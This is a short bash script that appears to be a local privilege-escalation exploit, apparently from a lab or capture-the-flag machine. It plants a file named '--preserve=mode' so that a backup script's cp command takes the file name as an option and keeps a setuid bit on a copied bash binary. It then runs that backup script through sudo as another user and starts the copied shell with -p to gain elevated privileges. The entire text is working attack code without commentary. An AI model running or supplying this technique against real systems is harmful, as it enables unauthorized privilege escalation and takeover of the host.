#! /bin/bash

BASH=$(which bash)
RANDOME_FOLDER=/tmp/$(echo $RANDOM | md5sum | head -c 20)

mkdir "$RANDOME_FOLDER"

cp "$BASH" "$RANDOME_FOLDER"
chmod u+s "$RANDOME_FOLDER/bash"

# file "--preserve=mode" will act as option to cp command
touch "$RANDOME_FOLDER/--preserve=mode"

FILE_NAME=$(date +%s)

sudo -u backup-cracked-user /home/backup-user/backup.sh "$RANDOME_FOLDER"

/opt/backups/$FILE_NAME/bash -p